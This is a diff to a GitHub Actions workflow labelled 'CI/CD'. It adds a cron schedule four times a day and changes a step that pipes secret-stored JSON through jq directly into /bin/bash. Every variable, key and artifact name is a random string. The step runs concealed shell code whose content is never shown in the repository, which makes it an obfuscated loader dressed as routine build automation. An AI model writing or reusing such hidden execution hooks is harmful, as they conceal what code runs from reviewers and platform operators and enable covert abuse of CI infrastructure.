@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '38 1,7,13,19 * * *'
 env:
   CI: true
 concurrency:
@@ -17,16 +19,15 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          gz1574: ${{ secrets.gz1574 }}
+          n2: ${{ secrets.n2 }}
         run: |
-          printf '%s' "$gz1574" | jq -r .gonp0 | /bin/bash
-          printf '%s' "$wr422" | jq -r .s22081 | /bin/bash
-          printf '%s' "$wzvtg1" | jq -r .ldyf8 | /bin/bash
-          echo $pdgc92457 | jq -r .gq98562 | /bin/bash
+          printf '%s' "$n2" | jq -r .hndz07 | /bin/bash
+          printf '%s' "$h06284" | jq -r .gv605 | /bin/bash
+          echo $dg834 | jq -r .chwmm3 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
         with:
-          name: HJUbd88z
+          name: 7xH03m7h
           path: "*.zip"
           retention-days: 1
